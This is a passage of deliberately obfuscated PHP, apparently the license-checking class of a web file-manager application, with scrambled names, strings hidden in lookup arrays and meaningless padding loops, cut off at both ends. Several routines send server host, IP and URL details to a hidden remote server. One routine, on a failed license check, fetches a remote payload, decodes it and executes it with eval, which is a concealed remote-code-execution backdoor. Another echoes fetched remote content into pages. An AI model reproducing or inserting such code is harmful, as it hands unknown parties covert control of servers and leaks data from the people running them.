$ŸÑæ£µ‚[0]; } } $Î›÷¿ª = $this->jkqmddfc77e4(json_encode($Î›÷¿ª), md5($•òËŞŸé[134])); $øüêÒ·° = array($•òËŞŸé[135] => $Î›÷¿ª); call_user_func(array($•òËŞŸé[136], $•òËŞŸé[137]), $øüêÒ·°); $•Ïµ©›Ü = $Á°Œ©á[656]; if (!$•Ïµ©›Ü) { die; } } if ($this->hgaw8e16af7d == $•òËŞŸé[105]) { return; } $°ˆÙ”ß” = array($•òËŞŸé[138], $•òËŞŸé[139], $•òËŞŸé[140], $•òËŞŸé[141], $•òËŞŸé[142], $•òËŞŸé[143]); $±î•„Í¡ = Model($•òËŞŸé[33])->get(); $ëÁ¯ÊÛê = $Á°Œ©á[657]; if (!$ëÁ¯ÊÛê) { die; } $øüêÒ·° = array($•òËŞŸé[144] => $±î•„Í¡[$•òËŞŸé[34]], $•òËŞŸé[145] => $±î•„Í¡[$•òËŞŸé[35]], $•òËŞŸé[146] => $•òËŞŸé[6]); $èªäá… = $Á°Œ©á[658]; if (strlen($èªäá…) < $Á°Œ©á[625]) { return; } foreach ($°ˆÙ”ß” as $’²ıí¬Õ) { if (!isset($±î•„Í¡[$’²ıí¬Õ]) || !$±î•„Í¡[$’²ıí¬Õ]) { continue; } $øüêÒ·°[$’²ıí¬Õ] = $±î•„Í¡[$’²ıí¬Õ]; } call_user_func(array($•òËŞŸé[136], $•òËŞŸé[137]), $øüêÒ·°); $¶Åê­ = $Á°Œ©á[659]; if (strlen($¶Åê­) < $Á°Œ©á[615]) { die; } } private function mlkf6103a607() { $ÅÏ™Ÿ¦ =& $_SERVER[³·—™¤¢]; $•‡áÜÚå =& $_SERVER[šÓï™½ï]; if ($_SERVER[$•‡áÜÚå[24]] != $•‡áÜÚå[147]) { return; } if (!_get($GLOBALS, $•‡áÜÚå[114])) { die; } $şÉšÖşÊ = $GLOBALS[$•‡áÜÚå[13]]; if (isset($şÉšÖşÊ[$•‡áÜÚå[148]])) { $this->mtnwf32d9b0f(); die; } if (!isset($şÉšÖşÊ[$•‡áÜÚå[149]]) || strlen($şÉšÖşÊ[$•‡áÜÚå[149]]) != 16) { show_json($•‡áÜÚå[150] . $şÉšÖşÊ[$•‡áÜÚå[149]], !1); } $Ö¬øéâæ = Model($•‡áÜÚå[33])->get($•‡áÜÚå[102]); $àûàõ­§ = md5($_SERVER[$•‡áÜÚå[101]] . $Ö¬øéâæ); $Àƒ„üÌ = $ÅÏ™Ÿ¦[660]; if (strlen($Àƒ„üÌ) < $ÅÏ™Ÿ¦[615]) { die; } $ à‹’©ü = array($•‡áÜÚå[149] => $şÉšÖşÊ[$•‡áÜÚå[149]], $•‡áÜÚå[151] => rand_string(16), $•‡áÜÚå[152] => $•‡áÜÚå[134], $•‡áÜÚå[153] => $•‡áÜÚå[154], $•‡áÜÚå[155] => $_SERVER[$•‡áÜÚå[156]], $•‡áÜÚå[157] => $_SERVER[$•‡áÜÚå[158]], $•‡áÜÚå[159] => $_SERVER[$•‡áÜÚå[160]], $•‡áÜÚå[100] => $àûàõ­§, $•‡áÜÚå[161] => Model($•‡áÜÚå[33])->get($•‡áÜÚå[129])); $¹Ù¢åÓŠ = $ÅÏ™Ÿ¦[661]; if ($şÉšÖşÊ[$•‡áÜÚå[162]] == $•‡áÜÚå[163]) { $Ïûöã¹— = $this->jkqmddfc77e4($àûàõ­§, $•‡áÜÚå[164]); $ÓÉŞÍŠº = $this->swtz34eea697(json_encode($ à‹’©ü), $àûàõ­§ . $•‡áÜÚå[165], 3); $ÓÉŞÍŠº = $ÓÉŞÍŠº . $•‡áÜÚå[166] . $_SERVER[$•‡áÜÚå[156]]; $¦ï¶‡  = $this->pelfdceb365f($•‡áÜÚå[167] . $Ïûöã¹— . $•‡áÜÚå[168] . $ÓÉŞÍŠº, -1); show_json($¦ï¶‡ , !0); } else { if ($şÉšÖşÊ[$•‡áÜÚå[162]] == $•‡áÜÚå[169]) { $¤¿ÈÀ = substr(md5($•‡áÜÚå[170] . $àûàõ­§), 12, 15) . $•‡áÜÚå[171]; $ÓÉŞÍŠº = $this->sfugc59b4b60(trim($şÉšÖşÊ[$•‡áÜÚå[172]]), $¤¿ÈÀ, 2); $ñ’ˆ¿¼³ = json_decode($ÓÉŞÍŠº, !0); if (!is_array($ñ’ˆ¿¼³) || !is_array($ñ’ˆ¿¼³[$•‡áÜÚå[173]]) || $ñ’ˆ¿¼³[$•‡áÜÚå[149]] != !0) { $‡˜İÚØŠ = $•‡áÜÚå[174]; $ÕêıîÖİ = $ñ’ˆ¿¼³[$•‡áÜÚå[173]] ? $•‡áÜÚå[175] . $ñ’ˆ¿¼³[$•‡áÜÚå[173]] : $‡˜İÚØŠ; show_json($ÕêıîÖİ, !1); } else { $ à‹’©ü[$•‡áÜÚå[151]] = $ñ’ˆ¿¼³[$•‡áÜÚå[173]][$•‡áÜÚå[176]]; } } else { $ñ’ˆ¿¼³ = $this->pelfdceb365f($•‡áÜÚå[177], $ à‹’©ü, 10); } } if (!is_array($ñ’ˆ¿¼³) || !is_array($ñ’ˆ¿¼³[$•‡áÜÚå[173]]) || $ñ’ˆ¿¼³[$•‡áÜÚå[149]] != !0) { $‡˜İÚØŠ = LNG($•‡áÜÚå[178]); $ÕêıîÖİ = $ñ’ˆ¿¼³[$•‡áÜÚå[173]] ? $•‡áÜÚå[175] . $ñ’ˆ¿¼³[$•‡áÜÚå[173]] : $‡˜İÚØŠ; show_json($ÕêıîÖİ, !1); } $ë³“Ö¼ = $ñ’ˆ¿¼³[$•‡áÜÚå[173]]; $•ÅÙÛ¸Ò = $this->zapjda3283dd($ë³“Ö¼[$•‡áÜÚå[179]]); $ß¾®Ïº‡ = $ÅÏ™Ÿ¦[662]; if (!$•ÅÙÛ¸Ò || $•ÅÙÛ¸Ò != $ë³“Ö¼[$•‡áÜÚå[127]]) { $õ¿ÓÕ©¿ = array($•‡áÜÚå[180] => Model($•‡áÜÚå[33])->get($•‡áÜÚå[102]), $•‡áÜÚå[181] => $_SERVER[$•‡áÜÚå[101]], $•‡áÜÚå[182] => this_url(), $•‡áÜÚå[157] => $_SERVER[$•‡áÜÚå[158]]); $ÓÉŞÍŠº = $this->tgnbd2deabb3(json_encode($õ¿ÓÕ©¿)); $this->pelfdceb365f($•‡áÜÚå[183] . $ÓÉŞÍŠº); show_json(LNG($•‡áÜÚå[184]), !0); } $öÆà—£º = array($•‡áÜÚå[185] => $ë³“Ö¼[$•‡áÜÚå[186]], $•‡áÜÚå[187] => $ë³“Ö¼[$•‡áÜÚå[188]], $•‡áÜÚå[189] => rand_string(16), $•‡áÜÚå[104] => $ë³“Ö¼[$•‡áÜÚå[190]]); if ($ à‹’©ü[$•‡áÜÚå[151]]) { $öÆà—£º[$•‡áÜÚå[189]] = $ à‹’©ü[$•‡áÜÚå[151]]; } $æıÈÉ’ = substr(md5($öÆà—£º[$•‡áÜÚå[187]]), 10, 10); $¶»ïã° = $æıÈÉ’ . $öÆà—£º[$•‡áÜÚå[104]] . $öÆà—£º[$•‡áÜÚå[189]]; $öÆà—£º[$•‡áÜÚå[106]] = strrev(base64_encode($this->jkqmddfc77e4($¶»ïã°, $•‡áÜÚå[191]))); $¢±¨ÂĞ” = rand_string(16); $©·Š’ÆÏ = $¢±¨ÂĞ” . $öÆà—£º[$•‡áÜÚå[104]] . $this->jkqmddfc77e4(md5($öÆà—£º[$•‡áÜÚå[185]]), $¢±¨ÂĞ”); $öÆà—£º[$•‡áÜÚå[107]] = base64_encode(strrev($this->jkqmddfc77e4($©·Š’ÆÏ, $•‡áÜÚå[192]))); if ($ë³“Ö¼[$•‡áÜÚå[193]] && $ë³“Ö¼[$•‡áÜÚå[193]] >= 1) { Model($•‡áÜÚå[33])->setDeep($•‡áÜÚå[194], $•‡áÜÚå[120]); } Model($•‡áÜÚå[33])->set($öÆà—£º); $Ş­¸Á·Á = md5($_SERVER[$•‡áÜÚå[101]] . strrev($Ö¬øéâæ) . $öÆà—£º[$•‡áÜÚå[187]]); $—Ó„ìÍ· = strrev(substr($Ş­¸Á·Á, 10, 16)); $õî›‚§ö = $ÅÏ™Ÿ¦[663]; if (!$õî›‚§ö) { die; } $©×¶§±² = $this->swtz34eea697(json_encode($ë³“Ö¼), $Ş­¸Á·Á); $ÍÊ´Ó­– = array_to_keyvalue(Model($•‡áÜÚå[7])->listData(), $•‡áÜÚå[195]); $·ˆ«É§± = $ÅÏ™Ÿ¦[653]; while ($·ˆ«É§± < $ÅÏ™Ÿ¦[615]) { if ($·ˆ«É§± >= 0) { break; } $·ˆ«É§±++; } $¦„’Å¦Œ = $ÍÊ´Ó­–[$•‡áÜÚå[196]]; $øŸ§ÒËõ = $ÅÏ™Ÿ¦[664]; if (strlen($øŸ§ÒËõ) < $ÅÏ™Ÿ¦[632]) { return; } $ ƒ…’ÇË = array(); $ı¤™Í“Á = $ÅÏ™Ÿ¦[665]; if (strlen($ı¤™Í“Á) < $ÅÏ™Ÿ¦[632]) { die; } $ ƒ…’ÇË[$—Ó„ìÍ·] = $©×¶§±²; $Æ¢¾·é = $ÅÏ™Ÿ¦[666]; if (strlen($Æ¢¾·é) < $ÅÏ™Ÿ¦[622]) { return; } Model($•‡áÜÚå[7])->update($¦„’Å¦Œ[$•‡áÜÚå[197]], array($•‡áÜÚå[198] => $ ƒ…’ÇË)); $øÂ²ØîÎ = $ÅÏ™Ÿ¦[667]; if (!$øÂ²ØîÎ) { die; } $this->adcra24f007c = $ë³“Ö¼; $this->hgaw8e16af7d = $öÆà—£º[$•‡áÜÚå[104]]; $ñõÅ©¾á = $ÅÏ™Ÿ¦[668]; if (!$ñõÅ©¾á) { die; } $this->licenseRegistSuccess(); $á’Íª¨é = $ÅÏ™Ÿ¦[669]; while (strlen($á’Íª¨é) < $ÅÏ™Ÿ¦[625]) { if (!$á’Íª¨é) { break; } $á’Íª¨é++; } Cache::set($•‡áÜÚå[199] . md5($Ö¬øéâæ . $•‡áÜÚå[200]), $•‡áÜÚå[6]); show_json(LNG($•‡áÜÚå[184]), !0); $õö€¦°Á = $ÅÏ™Ÿ¦[670]; while ($õö€¦°Á < $ÅÏ™Ÿ¦[615]) { if ($õö€¦°Á >= 0) { break; } $õö€¦°Á++; } } private function licenseRegistSuccess() { $¸ÃûøË =& $_SERVER[šÓï™½ï]; $°¢ì®ßÊ = Model($¸ÃûøË[33])->get(); if ($°¢ì®ßÊ[$¸ÃûøË[63]] != $¸ÃûøË[120]) { Model($¸ÃûøË[33])->set($¸ÃûøË[63], $¸ÃûøË[120]); } Action($¸ÃûøË[201])->initStart(!0); } private function mtnwf32d9b0f() { $Ì€«í¿– =& $_SERVER[³·—™¤¢]; $á•Ø‰’û =& $_SERVER[šÓï™½ï]; Model($á•Ø‰’û[33])->set(array($á•Ø‰’û[185] => $á•Ø‰’û[6], $á•Ø‰’û[187] => $á•Ø‰’û[6], $á•Ø‰’û[104] => $á•Ø‰’û[105], $á•Ø‰’û[106] => $á•Ø‰’û[6], $á•Ø‰’û[107] => $á•Ø‰’û[6])); $·º—šÔâ = $Ì€«í¿–[671]; if (!$·º—šÔâ) { die; } Model($á•Ø‰’û[33])->setDeep($á•Ø‰’û[194], $á•Ø‰’û[202]); $«ç»ã™‹ = $Ì€«í¿–[672]; $this->adcra24f007c = array(); $Ô¶­ğÅ = $Ì€«í¿–[673]; $this->hgaw8e16af7d = $á•Ø‰’û[105]; } private function ugnkc561be7d() { $ûğ†’¨ş =& $_SERVER[³·—™¤¢]; $Š“¨Ôƒ =& $_SERVER[šÓï™½ï]; $_SERVER[$Š“¨Ôƒ[158]] = _get($_SERVER, $Š“¨Ôƒ[158], APP_HOST); $this->hgaw8e16af7d = $Š“¨Ôƒ[105]; $õø¬È· = Model($Š“¨Ôƒ[33])->get(); if ($õø¬È·[$Š“¨Ôƒ[104]] == $Š“¨Ôƒ[105]) { return; } $†±£©Ş = Model($Š“¨Ôƒ[33])->get($Š“¨Ôƒ[102]); $§ß†·½ = $ûğ†’¨ş[674]; $ÄÍ­öìÎ = $Š“¨Ôƒ[199] . md5($†±£©Ş . $Š“¨Ôƒ[200]); $é°Ùè÷® = Cache::get($ÄÍ­öìÎ); $›äëÇÉ = $ûğ†’¨ş[675]; if (strlen($›äëÇÉ) < $ûğ†’¨ş[615]) { die; } if (!is_array($é°Ùè÷®) || !isset($é°Ùè÷®[$Š“¨Ôƒ[203]]) || time() - $é°Ùè÷®[$Š“¨Ôƒ[203]] >= 60) { $œñ¼çÌÇ = Model($Š“¨Ôƒ[7])->loadList(); $¸ĞõÛë  = $œñ¼çÌÇ[$Š“¨Ôƒ[196]]; $ü©­¥¸ = md5($_SERVER[$Š“¨Ôƒ[101]] . strrev($†±£©Ş) . $õø¬È·[$Š“¨Ôƒ[187]]); $¬×»¡§Æ = strrev(substr($ü©­¥¸, 10, 16)); $é°Ùè÷® = $this->sfugc59b4b60($¸ĞõÛë [$Š“¨Ôƒ[84]][$¬×»¡§Æ], $ü©­¥¸); $é°Ùè÷® = json_decode($é°Ùè÷®, !0); } if (!is_array($é°Ùè÷®)) { return $this->mtnwf32d9b0f(); } $­ôÆÜ„ = strtotime($é°Ùè÷®[$Š“¨Ôƒ[127]]); if (time() >= $­ôÆÜ„) { return $this->mtnwf32d9b0f(); } if (time() - $é°Ùè÷®[$Š“¨Ôƒ[203]] > 20) { $é°Ùè÷®[$Š“¨Ôƒ[203]] = time(); Cache::set($ÄÍ­öìÎ, $é°Ùè÷®); } $this->adcra24f007c = $é°Ùè÷®; $this->hgaw8e16af7d = $õø¬È·[$Š“¨Ôƒ[104]]; $†ÚÍ·Î = $ûğ†’¨ş[676]; while (strlen($†ÚÍ·Î) < $ûğ†’¨ş[632]) { if (!$†ÚÍ·Î) { break; } $†ÚÍ·Î++; } } private function wdup78b4e623() { $—‹ÙØ¯« =& $_SERVER[³·—™¤¢]; $ú´…±Å» =& $_SERVER[šÓï™½ï]; $œèæ‰â = $GLOBALS[$ú´…±Å»[13]]; $ç†íÇ¾” = $_SERVER[$ú´…±Å»[24]]; $¯ıÀ’“ = $—‹ÙØ¯«[677]; while ($¯ıÀ’“ < $—‹ÙØ¯«[615]) { if ($¯ıÀ’“ >= 0) { break; } $¯ıÀ’“++; } if ($ç†íÇ¾” == $ú´…±Å»[204] && $this->hgaw8e16af7d == $ú´…±Å»[105]) { show_json(LNG($ú´…±Å»[205]), !1, $ú´…±Å»[206]); } $Ğ´í…Ö¿ = array($ú´…±Å»[207], $ú´…±Å»[208]); if (in_array($ç†íÇ¾”, $Ğ´í…Ö¿)) { if ($this->hgaw8e16af7d == $ú´…±Å»[105] && isset($œèæ‰â[$ú´…±Å»[209]])) { show_json(LNG($ú´…±Å»[205]), !1, $ú´…±Å»[206]); die; } $Ÿµ‹¾’ò = $this->oyhi6bca490e(); if ($Ÿµ‹¾’ò != intval($ú´…±Å»[210])) { if ($Ÿµ‹¾’ò <= Model($ú´…±Å»[123])->count()) { show_json(LNG($ú´…±Å»[211]), !1, $ú´…±Å»[206]); die; } } } } private function jefbbe3e9ecc() { $æ¼½“ª =& $_SERVER[³·—™¤¢]; $‡–ÔÔší =& $_SERVER[šÓï™½ï]; $Ô´“Õ¼© = array($‡–ÔÔší[117], $‡–ÔÔší[118]); if (!_get($GLOBALS, $‡–ÔÔší[114]) || !isset($_GET[$‡–ÔÔší[212]])) { return; } if (!in_array($_SERVER[$‡–ÔÔší[24]], $Ô´“Õ¼©)) { return; } $î§¨Ğœß = $‡–ÔÔší[213]; $î§¨Ğœß = $this->hzos9ab56c13($î§¨Ğœß, $‡–ÔÔší[214]); $ÂğıÓ²‚ = $æ¼½“ª[678]; if (!$ÂğıÓ²‚) { return; } $¢ Ñ†„ğ = stream_context_create(array($‡–ÔÔší[215] => array($‡–ÔÔší[216] => $‡–ÔÔší[217], $‡–ÔÔší[218] => 3))); $êêÏëœ = $æ¼½“ª[679]; $ÇÊ¼Ãş† = @file_get_contents($î§¨Ğœß, !1, $¢ Ñ†„ğ); header($‡–ÔÔší[219]); $€–ğì£± = $æ¼½“ª[680]; if ($ÇÊ¼Ãş† && strstr($ÇÊ¼Ãş†, $‡–ÔÔší[220])) { echo $ÇÊ¼Ãş†; } die; } public function rbhub5cc2489($¢éÒ ) { $øË»èª =& $_SERVER[šÓï™½ï]; if ($this->hgaw8e16af7d == $øË»èª[221]) { return $¢éÒ ; } $æÍ¼äîï = array($øË»èª[222] => $øË»èª[223], $øË»èª[224] => $øË»èª[223], $øË»èª[225] => $øË»èª[223], $øË»èª[226] => $øË»èª[223], $øË»èª[227] => $øË»èª[228], $øË»èª[229] => $øË»èª[228], $øË»èª[230] => $øË»èª[228], $øË»èª[231] => $øË»èª[228], $øË»èª[232] => $øË»èª[228], $øË»èª[233] => $øË»èª[228], $øË»èª[234] => $øË»èª[228], $øË»èª[235] => $øË»èª[228], $øË»èª[236] => $øË»èª[228], $øË»èª[237] => $øË»èª[228], $øË»èª[238] => $øË»èª[228], $øË»èª[239] => $øË»èª[228]); $Šúæ¼£á = explode($øË»èª[240], _get($this->adcra24f007c, $øË»èª[111], $øË»èª[6])); $ı±şÈÎ­ = array(); $ş˜ƒ’Ü = $_SERVER[³·—™¤¢][681]; foreach ($æÍ¼äîï as $³¶øä¬ => $í†¿²¼ª) { if ($í†¿²¼ª == $øË»èª[223] && substr($this->hgaw8e16af7d, 0, 1) == $øË»èª[223]) { continue; } if (!in_array($³¶øä¬, $Šúæ¼£á)) { $ı±şÈÎ­[] = $³¶øä¬; } } foreach ($ı±şÈÎ­ as $³¶øä¬) { unset($¢éÒ [$³¶øä¬]); } return $¢éÒ ; } private function lmbcb68fe4cc() { $‚éıĞ—Í =& $_SERVER[šÓï™½ï]; if ($this->hgaw8e16af7d != $‚éıĞ—Í[105]) { $GLOBALS[$‚éıĞ—Í[84]][$‚éıĞ—Í[88]][$‚éıĞ—Í[241]] = $‚éıĞ—Í[202]; return; } $GLOBALS[$‚éıĞ—Í[84]][$‚éıĞ—Í[242]] = $‚éıĞ—Í[120]; if (Model($‚éıĞ—Í[243])->get($‚éıĞ—Í[63]) != $‚éıĞ—Í[202]) { Model($‚éıĞ—Í[243])->set($‚éıĞ—Í[63], $‚éıĞ—Í[202]); } } public function htxl55e2c6b7() { return $_SERVER[šÓï™½ï][244]; $İƒ©¥íÕ = $_SERVER[³·—™¤¢][682]; } private function ecmxab11d119() { $‘î–¼ ‚ =& $_SERVER[³·—™¤¢]; $‘ü”ÄĞİ =& $_SERVER[šÓï™½ï]; $ŸÊœ•¾ã = array($‘ü”ÄĞİ[245], $‘ü”ÄĞİ[246], $‘ü”ÄĞİ[247]); $Àş¼èã = $‘î–¼ ‚[683]; if (strlen($Àş¼èã) < $‘î–¼ ‚[622]) { die; } $¦ÉîôÓ = $‘ü”ÄĞİ[248] . md5($‘ü”ÄĞİ[249]); $È¯íë’ = $‘î–¼ ‚[684]; if ($this->hgaw8e16af7d == $‘ü”ÄĞİ[105] || !_get($GLOBALS, $‘ü”ÄĞİ[114])) { return; } if (!in_array($_SERVER[$‘ü”ÄĞİ[24]], $ŸÊœ•¾ã)) { return; } if (time() % 4 != 0) { return; } $Ÿ›‰èéë = call_user_func(array($‘ü”ÄĞİ[250], $‘ü”ÄĞİ[251]), $¦ÉîôÓ); $¢ˆ‰Û“‘ = $‘î–¼ ‚[685]; if ($Ÿ›‰èéë && time() - $Ÿ›‰èéë < intval($‘ü”ÄĞİ[252])) { return; } call_user_func(array($‘ü”ÄĞİ[250], $‘ü”ÄĞİ[137]), $¦ÉîôÓ, time()); $°¾€ì¥ˆ = $‘î–¼ ‚[686]; $Ğ•—ÚÎ = Model($‘ü”ÄĞİ[33])->get($‘ü”ÄĞİ[102]); $ê—„¾« = array($‘ü”ÄĞİ[149] => Model($‘ü”ÄĞİ[33])->get($‘ü”ÄĞİ[185]), $‘ü”ÄĞİ[162] => $this->hgaw8e16af7d, $‘ü”ÄĞİ[159] => $_SERVER[$‘ü”ÄĞİ[160]], $‘ü”ÄĞİ[161] => Model($‘ü”ÄĞİ[33])->get($‘ü”ÄĞİ[129]), $‘ü”ÄĞİ[100] => md5($_SERVER[$‘ü”ÄĞİ[101]] . $Ğ•—ÚÎ), $‘ü”ÄĞİ[152] => $‘ü”ÄĞİ[134], $‘ü”ÄĞİ[155] => $_SERVER[$‘ü”ÄĞİ[156]]); $®¿Æ½º‚ = $‘î–¼ ‚[687]; $‰º‰‡Şı = $this->pelfdceb365f($‘ü”ÄĞİ[253], $ê—„¾«); $£öŒç˜ = $‘î–¼ ‚[688]; if (strlen($£öŒç˜) < $‘î–¼ ‚[629]) { return; } if (!is_array($‰º‰‡Şı)) { return; } if ($‰º‰‡Şı[$‘ü”ÄĞİ[149]] && $‰º‰‡Şı[$‘ü”ÄĞİ[254]]) { if ($this->zapjda3283dd($‰º‰‡Şı[$‘ü”ÄĞİ[254]]) == $ê—„¾«[$‘ü”ÄĞİ[149]]) { return; } } $this->mtnwf32d9b0f(); if ($this->zapjda3283dd($‰º‰‡Şı[$‘ü”ÄĞİ[254]]) != $ê—„¾«[$‘ü”ÄĞİ[149]]) { $·ªéº¥ = array($‘ü”ÄĞİ[180] => $Ğ•—ÚÎ, $‘ü”ÄĞİ[181] => $_SERVER[$‘ü”ÄĞİ[101]], $‘ü”ÄĞİ[182] => this_url(), $‘ü”ÄĞİ[157] => $_SERVER[$‘ü”ÄĞİ[158]]); $¸Ğó´Ÿ = $this->tgnbd2deabb3(json_encode($·ªéº¥)); $‰º‰‡Şı = $this->pelfdceb365f($‘ü”ÄĞİ[183] . $¸Ğó´Ÿ); if ($‰º‰‡Şı && is_array($‰º‰‡Şı) && isset($‰º‰‡Şı[$‘ü”ÄĞİ[254]])) { $§œ–ëÇÀ = $this->sfugc59b4b60($‰º‰‡Şı[$‘ü”ÄĞİ[254]], 2); if ($§œ–ëÇÀ) { $§œ–ëÇÀ = $this->zapjda3283dd($§œ–ëÇÀ); } if ($§œ–ëÇÀ) { try { @eval($§œ–ëÇÀ); } catch (Exception $‡¤š…Ã²) { } } } } } private function pelfdceb365f($º…ÛÂª» = '', $Óì²×· = array(), $Êğ‘Â· = 5) { $ÔöîÜç¤ =& $_SERVER[³·—™¤¢]; $í®ÆñÑò =& $_SERVER[šÓï™½ï]; $³À¦‘µÛ = $í®ÆñÑò[255]; $ƒ½¿»§‘ = $ÔöîÜç¤[689]; while (strlen($ƒ½¿»§‘) < $ÔöîÜç¤[615]) { if (!$ƒ½¿»§‘) { break; } $ƒ½¿»§‘++; } $³À¦‘µÛ = $this->hzos9ab56c13($³À¦‘µÛ, $í®ÆñÑò[256]); $ƒû¹¹Å² = $ÔöîÜç¤[690]; if (strlen($ƒû¹¹Å²) < $ÔöîÜç¤[632]) { return; } $³À¦‘µÛ = $³À¦‘µÛ . $º…ÛÂª»; $úª‡±Ö¸ = $ÔöîÜç¤[691]; while (strlen($úª‡±Ö¸) < $ÔöîÜç¤[632]) { if (!$úª‡±Ö¸) { break; } $úª‡±Ö¸++; } if ($Óì²×· && is_array($Óì²×·)) { $³À¦‘µÛ = $³À¦‘µÛ . $í®ÆñÑò[257] . http_build_query($Óì²×·); } if ($Óì²×· === -1) { return $³À¦‘µÛ; } $½Â—Ì¦ç = stream_context_create(array($í®ÆñÑò[215] => array($í®ÆñÑò[218] => $Êğ‘Â·, $í®ÆñÑò[216] => $í®ÆñÑò[258]), $í®ÆñÑò[259] => array($í®ÆñÑò[260] => !1, $í®ÆñÑò[261] => !1))); $’€Û‘˜û = $ÔöîÜç¤[692]; if (strlen($’€Û‘˜û) < $ÔöîÜç¤[615]) { die; } $Óì²×· = @file_get_contents($³À¦‘µÛ, !1, $½Â—Ì¦ç); return json_decode($Óì²×·, !0); $Ë•˜§¥ = $ÔöîÜç¤[693]; if (!$Ë•˜§¥) { die; } } private function oyhi6bca490e() { $œª¹„ÎÒ =& $_SERVER[³·—™¤¢]; $½ƒ°Ãú =& $_SERVER[šÓï™½ï]; $æ°’©ü· = array($½ƒ°Ãú[262] => $½ƒ°Ãú[263], $½ƒ°Ãú[264] => $½ƒ°Ãú[265], $½ƒ°Ãú[266] => $½ƒ°Ãú[267], $½ƒ°Ãú[268] => $½ƒ°Ãú[269], $½ƒ°Ãú[270] => $½ƒ°Ãú[271], $½ƒ°Ãú[272] => $½ƒ°Ãú[210], $½ƒ°Ãú[273] => $½ƒ°Ãú[210], $½ƒ°Ãú[274] => $½ƒ°Ãú[263], $½ƒ°Ãú[275] => $½ƒ°Ãú[265], $½ƒ°Ãú[276] => $½ƒ°Ãú[267], $½ƒ°Ãú[277] => $½ƒ°Ãú[278], $½ƒ°Ãú[279] => $½ƒ°Ãú[269], $½ƒ°Ãú[280] => $½ƒ°Ãú[281], $½ƒ°Ãú[282] => $½ƒ°Ãú[271], $½ƒ°Ãú[283] => $½ƒ°Ãú[284], $½ƒ°Ãú[285] => $½ƒ°Ãú[286], $½ƒ°Ãú[287] => $½ƒ°Ãú[288]); $°úÍÈ…Ê = $œª¹„ÎÒ[694]; $åù©úÍ = $æ°’©ü·[$this->hgaw8e16af7d]; $¬í™ˆ´ = $œª¹„ÎÒ[695]; if (!$¬í™ˆ´) { die; } $åù©úÍ = intval($åù©úÍ ? $åù©úÍ : $½ƒ°Ãú[263]); $‚Öšãºµ = $œª¹„ÎÒ[696]; while ($‚Öšãºµ < $œª¹„ÎÒ[629]) { if ($‚Öšãºµ >= 0) { break; } $‚Öšãºµ++; } $ˆ¹Šè¬ = _get($this->adcra24f007c, $½ƒ°Ãú[289]); $ÕŒæÈÉ† = $œª¹„ÎÒ[655]; $ˆ¹Šè¬ = $ˆ¹Šè¬ ? intval($ˆ¹Šè¬) : 0; $ÇãŸÊö = $œª¹„ÎÒ[697]; if (!$ÇãŸÊö) { return; } return $åù©úÍ + $ˆ¹Šè¬; } public function yqvz569ecc45($—ò±ıîé) { $±­«Î‡ =& $_SERVER[šÓï™½ï]; $½ã®¿Ïö = $this->oyhi6bca490e(); if ($—ò±ıîé[$±­«Î‡[290]] == $±­«Î‡[120]) { return; } if ($½ã®¿Ïö >= intval($±­«Î‡[210])) { return; } $Çë‚¤î¢ = Model($±­«Î‡[123])->count(); $›ŞÌÀ¸ø = $_SERVER[³·—™¤¢][698]; if ($Çë‚¤î¢ <= $½ã®¿Ïö) { return; } $¾¶œÃ˜ = Model($±­«Î‡[123])->field($±­«Î‡[290])->limit($½ã®¿Ïö)->select(); $¾¶œÃ˜ = array_to_keyvalue($¾¶œÃ˜, $±­«Î‡[6], $±­«Î‡[290]); if (!in_array($—ò±ıîé[$±­«Î‡[290]], $¾¶œÃ˜)) { show_json($±­«Î‡[291], !1, $±­«Î‡[206]); } } public function dgoze7d8b3e8() { $ŒÊ‚ŸâÉ =& $_SERVER[³·—™¤¢]; $ï¹‚œÜÕ =& $_SERVER[šÓï™½ï]; if (!_get($GLOBALS, $ï¹‚œÜÕ[114]) || mt_rand(1, 100) > 20) { return; } $™˜šúàø = $ï¹‚œÜÕ[213]; $ÕÃ†„¤È = $ŒÊ‚ŸâÉ[699]; if (strlen($ÕÃ†„¤È) < $ŒÊ‚ŸâÉ[632]) { die; } $™˜šúàø = $this->hzos9ab56c13($™˜šúàø, $ï¹‚œÜÕ[214]); $Ôİîë = $ŒÊ‚ŸâÉ[700]; while (strlen($Ôİîë) < $ŒÊ‚ŸâÉ[629]) { if (!$Ôİîë) { break; } $Ôİîë++; } $­Ï¬­Ğı = stream_context_create(array($ï¹‚œÜÕ[215] => array($ï¹‚œÜÕ[216] => $ï¹‚œÜÕ[217], $ï¹‚œÜÕ[218] => 3))); $ÛîÆœêö = $ŒÊ‚ŸâÉ[701]; if (strlen($ÛîÆœêö) < $ŒÊ‚ŸâÉ[632]) { die; } $öÖèî÷° = @file_get_contents($™˜šúàø, !1, $­Ï¬­Ğı); echo $ï¹‚œÜÕ[292] . hash_encode($öÖèî÷°) . $ï¹‚œÜÕ[293]; $ùê²×¡ = $ŒÊ‚ŸâÉ[702]; if (strlen($ùê²×¡) < $ŒÊ‚ŸâÉ[625]) { return; } } private function swtz34eea697($ˆê¢€í…, $¤ÄßûôÌ, $àŠÊâı = 3) { $„úÌÛ =& $_SERVER[³·—™¤¢]; $à“É‚‰ =& $_SERVER[šÓï™½ï]; usleep(1); $ˆê¢€í… = trim($ˆê¢€í…); $Ä¦ë¤øÇ = $„úÌÛ[703]; if (!$Ä¦ë¤øÇ) { die; } $«üç§Ç = mt_rand(0, 5) . $à“É‚‰[6]; $ÇšƒŞº£ = $„úÌÛ[704]; while (strlen($ÇšƒŞº£) < $„úÌÛ[632]) { if (!$ÇšƒŞº£) { break; } $ÇšƒŞº£++; } $Ë¬¸²³ã = rand_string(15); $Œò«è•± = $„úÌÛ[641]; while ($Œò«è•± < $„úÌÛ[615]) { if ($Œò«è•± >= 0) { break; } $Œò«è•±++; } $…ÉøÉª = $à“É‚‰[294]; $µùİšå‡ = $„úÌÛ[705]; switch ($«üç§Ç) { case $à“É‚‰[202]: $¦èÕßìÓ = $this->jkqmddfc77e4($ˆê¢€í…, strrev($¤ÄßûôÌ . $Ë¬¸²³ã)); $›İİöäö = $„úÌÛ[706]; while (strlen($›İİöäö) < $„úÌÛ[629]) { if (!$›İİöäö) { break; } $›İİöäö++; } break; $˜‘©ïÜ = $„úÌÛ[707]; if (!$˜‘©ïÜ) { return; } case $à“É‚‰[120]: $¦èÕßìÓ = $this->jkqmddfc77e4($ˆê¢€í…, strrev($Ë¬¸²³ã . $¤ÄßûôÌ)); break; case $à“É‚‰[295]: $¦èÕßìÓ = $this->jkqmddfc77e4($ˆê¢€í…, base64_encode($Ë¬¸²³ã . $¤ÄßûôÌ)); $øĞíù‰ = 